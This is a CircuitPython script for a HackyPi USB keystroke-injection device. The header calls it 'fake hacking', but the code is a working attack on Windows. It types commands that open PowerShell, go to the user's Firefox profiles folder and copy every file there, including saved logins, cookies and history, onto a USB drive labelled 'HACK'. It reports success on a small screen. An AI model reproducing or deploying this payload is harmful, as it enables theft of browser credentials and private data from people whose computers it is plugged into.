# Basic Program for some cool fake hacking 
# Works for Windows-based PC/Laptop but can be modified for other OS
import time
import os
import usb_hid
import digitalio
import board
import busio
import terminalio
import displayio
from adafruit_display_text import label
from adafruit_hid.keyboard import Keyboard, Keycode
from keyboard_layout_win_fr import KeyboardLayout
from adafruit_st7789 import ST7789
import storage
import adafruit_sdcard

# First set some parameters used for shapes and text
BORDER = 12
FONTSCALE = 3
BACKGROUND_COLOR = 0xFF0000  # Red
FOREGROUND_COLOR = 0xFFFF00  # Yellow
TEXT_COLOR = 0x0000ff  # Blue

# Release any resources currently in use for the displays
displayio.release_displays()

tft_clk = board.GP10 # must be a SPI CLK
tft_mosi= board.GP11 # must be a SPI TX
tft_rst = board.GP12
tft_dc  = board.GP8
tft_cs  = board.GP9
spi = busio.SPI(clock=tft_clk, MOSI=tft_mosi)


# Make the displayio SPI bus and the GC9A01 display
display_bus = displayio.FourWire(spi, command=tft_dc, chip_select=tft_cs, reset=tft_rst)
display = ST7789(display_bus, rotation=270, width=240, height=135, rowstart=40, colstart=53)

# Make the display context
splash = displayio.Group()
display.show(splash)

color_bitmap = displayio.Bitmap(display.width, display.height, 1)
color_palette = displayio.Palette(1)
color_palette[0] = BACKGROUND_COLOR

# Define LED (as backlight) pin as output
tft_bl = board.GP13  # GPIO pin to control backlight LED
led = digitalio.DigitalInOut(tft_bl)
led.direction = digitalio.Direction.OUTPUT
led.value = True

bg_sprite = displayio.TileGrid(color_bitmap, pixel_shader=color_palette, x=0, y=0)
splash.append(bg_sprite)

# This function creates a colorful rectangular box
def inner_rectangle():
    inner_bitmap = displayio.Bitmap(display.width - BORDER * 2, display.height - BORDER * 2, 1)
    inner_palette = displayio.Palette(1)
    inner_palette[0] = FOREGROUND_COLOR
    inner_sprite = displayio.TileGrid(inner_bitmap, pixel_shader=inner_palette, x=BORDER, y=BORDER)
    splash.append(inner_sprite)

# Function to print data on the TFT
def print_onTFT(text, x_pos, y_pos):
    text_area = label.Label(terminalio.FONT, text=text, color=TEXT_COLOR)
    text_group = displayio.Group(scale=FONTSCALE, x=x_pos, y=y_pos)
    text_group.append(text_area)  # Subgroup for text scaling
    splash.append(text_group)


# Main script starts here
inner_rectangle()
print_onTFT("Welcome to", 30, 40)
print_onTFT("HackyPi", 60, 80)
time.sleep(3)

try:
    keyboard = Keyboard(usb_hid.devices)
    keyboard_layout = KeyboardLayout(keyboard)
    time.sleep(1)

    # Simulate opening Powershell
    keyboard.send(Keycode.WINDOWS, Keycode.R)
    time.sleep(0.3)
    keyboard_layout.write("powershell")
    keyboard.send(Keycode.ENTER)
    time.sleep(0.5)
    time.sleep(1.2)

    # Display success message on the TFT
    inner_rectangle()
    print_onTFT("Powershell", 30, 40)
    print_onTFT("Ok", 60, 80)
    time.sleep(1)

    # Simulate navigating to Firefox profiles
    keyboard.send(Keycode.ENTER)
    keyboard.send(Keycode.ENTER)
    time.sleep(2)
    keyboard_layout.write("cd AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
    keyboard.send(Keycode.ENTER)
    #keyboard_layout.write("dir")
    keyboard.send(Keycode.ENTER)
    
    keyboard_layout.write("$var = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 -and $_.VolumeName -eq 'HACK' } | Select-Object -ExpandProperty DeviceID")
    keyboard.send(Keycode.ENTER)
    time.sleep(0.5)
    # Script PowerShell à intégrer
    powershell_script = '''
    # Définir la destination
    $var = (Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 -and $_.VolumeName -eq 'HACK' }).DeviceID

    $files = Get-ChildItem -Recurse -File
    $totalSize = $files | Measure-Object -Property Length -Sum | Select-Object -ExpandProperty Sum

    $copiedSize = 0

    foreach ($file in $files) {
    # Calcul du chemin de destination
    $destination = Join-Path -Path $var -ChildPath $file.FullName.Substring((Get-Location).Path.Length).TrimStart('\')
    
    $destinationDir = Split-Path -Parent $destination
    if (-not (Test-Path -Path $destinationDir)) {
        New-Item -ItemType Directory -Path $destinationDir | Out-Null
    }

    Copy-Item -Path $file.FullName -Destination $destination

    $copiedSize += $file.Length

    # Calcul et affichage du pourcentage
    $progress = [int](($copiedSize / $totalSize) * 100)
    Write-Host "Progress: $progress%" -NoNewline
    Write-Host " `r" -NoNewline
}

Write-Host "Copie terminée."
    '''

    # Écriture du script dans PowerShell via Python
    keyboard_layout.write(f"{powershell_script}\"")
    keyboard.send(Keycode.ENTER)
    
    # Display success message on the TFT
    inner_rectangle()
    print_onTFT("Copies des profils", 30, 40)
    print_onTFT("Ok", 60, 80)
    time.sleep(3)
    

  

    keyboard.release_all()

except Exception as ex:
    keyboard.release_all()
    print(f"[ERROR] {ex}")


